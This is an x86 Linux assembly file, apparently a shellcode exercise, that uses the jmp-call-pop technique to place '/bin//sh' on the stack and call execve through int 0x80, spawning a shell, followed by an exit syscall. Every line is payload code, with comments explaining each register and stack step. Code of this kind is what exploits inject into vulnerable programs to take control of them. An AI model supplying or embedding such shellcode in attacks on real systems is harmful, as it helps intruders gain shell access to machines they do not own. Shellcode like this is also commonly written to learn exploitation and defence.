global _start

section .text
    
_start:
    ; Zeroing of registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    jmp short binSH_str     ; jmp-call-pop technique

pop_shell:
    mov dword esi, [esp]    ; Address of source string to be copied
    mov cl, 0x8             ; Length of string to be copied(counter)

mov_binSH_to_buffer:
    push edx                ; Reserved for 0x00000000    
    push edx                ; Reserved for "//sh"
    push edx                ; Reserved for "/bin"
    mov edi, esp            ; Address of destination buffer to be copied
    rep movsb               ; Moving individual bytes till counter is reached

execve:
    ;   [ '/bin//sh' | 0x00000000 ]
    mov ebx, esp
  
    ;   [ Addr of '/bin//sh' | 0x00000000 | '/bin//sh' | 0x00000000 ] 
    push edx                ; Reserved for 0x00000000
    push ebx                ; Address of '/bin//sh'

    mov al, 0xB             ; Sycall # for execve()
    mov ecx, esp            ; ['/bin//sh', NULL ]
    int 0x80

exit:
    xor eax, eax            ; eax = 0
    inc eax                 ; Syscall # for exit()
    xor ebx, ebx            ; exit code
    int 0x80

binSH_str:
    call pop_shell
    binSH: db "/bin//sh"
